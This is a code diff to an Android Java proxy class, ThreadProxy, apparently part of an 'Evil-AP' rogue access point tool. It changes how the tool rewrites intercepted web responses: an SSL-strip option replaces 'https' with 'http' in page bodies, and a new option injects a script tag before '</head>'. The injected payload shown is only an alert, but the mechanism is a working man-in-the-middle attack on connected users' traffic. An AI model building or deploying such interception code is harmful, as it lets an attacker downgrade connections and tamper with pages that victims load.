@@ -6,14 +6,10 @@ import android.util.Log;
 import java.io.BufferedReader;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
-import java.io.OutputStreamWriter;
-import java.io.PrintWriter;
 import java.io.UnsupportedEncodingException;
 import java.net.Socket;
 
@@ -71,10 +67,11 @@ public class ThreadProxy implements Runnable{
             //check what we are sending back
             String contentType = res.header("Content-Type");
 
-            //EDIT RESPONSE HERE (SSL STRIP)
-            if(mConfig.getBoolean("sslStrip", false) && contentType != null &&
-                    contentType.contains("text"))
-                bytesBody = sslStrip(bytesBody);
+            //WE EDIT RESPONSE HERE
+            Boolean sslStrip = false, jsInject = false;
+            if( (sslStrip = mConfig.getBoolean("sslStrip", false))
+                    || (jsInject = mConfig.getBoolean("jsInject", false)) )
+                bytesBody = editBytes(bytesBody, sslStrip, jsInject);
             //prepare proper length response headers
             String headers = getResponseHeaders(res, bytesBody.length, getEtag(sRequest));
             headers = headers.replaceAll("\\n", "\r\n");
@@ -130,10 +127,17 @@ public class ThreadProxy implements Runnable{
         return streamResponse;
     }
 
-    private byte[] sslStrip(byte[] bytesBody) {
+    private byte[] editBytes(byte[] bytesBody, Boolean sslStrip, Boolean jsInject) {
         try {
             String response = new String(bytesBody, "UTF-8");
-            response = response.replaceAll("https", "http");
+            if (sslStrip) {
+                response = response.replaceAll("https", "http");
+            }
+            if (jsInject){
+                //INJECT !
+                response = response.replaceAll("</head>", "<script type=\"text/javascript\">" +
+                        " alert(\"Hello from Evil-AP!\"); </script></head>");
+            }
             return response.getBytes();
         } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
